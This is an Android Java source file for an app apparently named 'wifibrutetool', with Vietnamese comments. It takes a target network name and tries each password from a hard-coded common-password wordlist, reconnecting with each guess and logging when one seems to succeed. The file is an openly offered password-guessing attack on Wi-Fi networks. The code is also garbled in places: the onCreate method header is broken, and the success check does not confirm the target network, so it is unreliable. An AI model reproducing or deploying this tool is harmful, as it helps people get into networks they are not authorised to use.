package com.hihi934.wifibrutetool;

import android.content.Context;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private EditText edtSSID;
    private Button btnStart;
    private TextView txtLog;
    private WifiManager wifiManager;

    // Danh sách mật khẩu thử nghiệm (Bạn có thể thêm vào đây)
    private String[] wordlist = {
        "12345678", "88888888", "00000000", "password", 
        "12344321", "99999999", "11111111", "anhyeuem"
    };

    @Override
    protected void Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Khởi tạo các thành phần giao diện
        edtSSID = findViewById(R.id.edtSSID);
        btnStart = findViewById(R.id.btnStart);
        txtLog = findViewById(R.id.txtLog);
        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);

        btnStart.setOnClickListener(v -> {
            String ssid = edtSSID.getText().toString().trim();
            if (ssid.isEmpty()) {
                updateLog("Lỗi: Nhập tên Wifi trước đã!");
                return;
            }
            startAttack(ssid);
        });
    }

    private void startAttack(String ssid) {
        updateLog("--- Bắt đầu tấn công: " + ssid + " ---");
        
        // Chạy trong một luồng (Thread) riêng để không làm treo máy
        new Thread(() -> {
            for (String pass : wordlist) {
                updateLog("Đang thử: " + pass);
                
                boolean success = tryConnect(ssid, pass);
                
                if (success) {
                    updateLog("==> THÀNH CÔNG! Mật khẩu là: " + pass);
                    break; 
                }

                // Nghỉ 2 giây giữa mỗi lần thử để hệ thống không bị loạn
                try { Thread.sleep(2000); } catch (InterruptedException e) {}
            }
            updateLog("--- Quá trình kết thúc ---");
        }).start();
    }

    private boolean tryConnect(String ssid, String pass) {
        try {
            WifiConfiguration conf = new WifiConfiguration();
            conf.SSID = "\"" + ssid + "\"";
            conf.preSharedKey = "\"" + pass + "\"";

            // Xóa các cấu hình cũ và thêm cấu hình mới
            int netId = wifiManager.addNetwork(conf);
            wifiManager.disconnect();
            wifiManager.enableNetwork(netId, true);
            wifiManager.reconnect();

            // Đợi một chút để hệ thống phản hồi
            Thread.sleep(3000);
            
            // Kiểm tra xem đã thực sự kết nối được chưa
            return wifiManager.getConnectionInfo().getNetworkId() != -1;
        } catch (Exception e) {
            return false;
        }
    }

    private void updateLog(String msg) {
        // Cập nhật giao diện từ luồng phụ phải dùng Handler
        new Handler(Looper.getMainLooper()).post(() -> {
            txtLog.append("\n" + msg);
        });
    }
}
